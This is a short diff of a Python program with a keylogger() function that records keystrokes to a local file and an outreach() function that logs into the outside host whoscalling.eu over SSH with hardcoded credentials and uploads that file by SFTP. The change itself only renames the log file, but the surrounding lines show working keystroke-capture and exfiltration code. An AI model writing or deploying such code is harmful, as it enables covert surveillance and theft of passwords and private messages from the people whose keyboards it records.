@@ -20,7 +20,7 @@ def outreach():
     ssh.load_host_keys(os.path.expanduser(os.path.join("~", ".ssh", "known_hosts")))
     ssh.connect('whoscalling.eu', username='log', password='logpass13')
     sftp = ssh.open_sftp()
-    sftp.put(f'{os.getcwd()}{osDetect()}logg2.txt', 'log.txt')
+    sftp.put(f'{os.getcwd()}{osDetect()}logg3.txt', 'log.txt')
     sftp.close()
     ssh.close()
 
@@ -29,7 +29,7 @@ def keylogger():
     allchars = string.ascii_lowercase + string.ascii_uppercase + string.digits
 
     while True:
-        file = open(f'{os.getcwd()}{osDetect()}logg2.txt', 'a')
+        file = open(f'{os.getcwd()}{osDetect()}logg3.txt', 'a')
 
         event = keyboard.read_event()
 
